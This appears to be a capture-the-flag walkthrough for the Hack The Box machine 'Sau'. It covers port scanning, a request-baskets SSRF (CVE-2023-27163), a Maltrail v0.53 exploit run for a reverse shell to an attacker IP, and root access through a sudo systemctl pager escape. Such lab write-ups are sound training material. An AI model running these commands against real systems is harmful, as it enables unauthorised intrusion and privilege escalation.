# [Sau](https://app.hackthebox.com/machines/sau)

```bash
nmap -p- --min-rate 10000 10.10.11.224 -Pn 
```

![Alt text](img/image.png)


After discovering open ports, let's do greater nmap scan.

```bash
nmap -A -sC -sV -p22,55555 10.10.11.224
```

![Alt text](img/image-2.png)


While opening port (55555) via HTTP protocol, I see such an web application.

![Alt text](img/image-1.png)


I see that it is powered by 'request-baskets' and version of this is '1.2.1'.


I searched publicly known exploit and found [this](https://github.com/entr0pie/CVE-2023-27163) whose CVE id is '**CVE-2023-27163**'.


![Alt text](img/image-3.png)

Let's access URL 'http://10.10.11.224:55555/xrvfmp'.

![Alt text](img/image-4.png)


I see that it is 'Maltrail' application and version of this 'v0.53'.

I again searched publicly known exploit and found [this](https://github.com/spookier/Maltrail-v0.53-Exploit) vulnerability.

```bash
python3 exploit.py 10.10.16.7 1337 http://10.10.11.224:55555/xrvfmp
```

![Alt text](img/image-5.png)


I got reverse shell from port (1337).

![Alt text](img/image-6.png)


Let's make interactive shell.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-7.png)


user.txt

![Alt text](img/image-8.png)


For privilege escalation, I just run `sudo -l` command.

![Alt text](img/image-9.png)


I see that `systemctl` binary can be exploited via `root` user.

I already get this binary's exploitation for privilege escalation on [Gtfobins](https://gtfobins.github.io/gtfobins/systemctl/#sudo).

```bash
sudo /usr/bin/systemctl status trail.service
!sh
```

![Alt text](img/image-10.png)


root.txt

![Alt text](img/image-11.png)